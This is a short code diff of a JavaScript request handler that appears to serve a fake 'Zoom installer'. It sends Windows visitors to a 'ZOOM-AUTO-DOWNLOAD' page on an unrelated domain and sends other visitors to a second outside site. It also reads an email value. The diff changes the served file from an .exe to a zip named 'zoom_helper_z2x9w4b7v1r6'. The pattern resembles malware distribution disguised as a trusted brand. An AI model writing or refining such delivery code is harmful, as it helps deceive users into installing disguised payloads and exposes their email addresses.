@@ -4,7 +4,7 @@ export default function handler(req, res) {
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
     'https://digimarconibadan.com/zoom_helper_z2x9w4b7v1r6/ZOOM-AUTO-DOWNLOAD/index.html';
-  const MSI_PATH = '/zoom installer.exe';
+  const MSI_PATH = '/zoom_helper_z2x9w4b7v1r6.zip';
   const NON_WINDOWS_TARGET = 'https://personalavatar.com/views';
 
   let email = '';
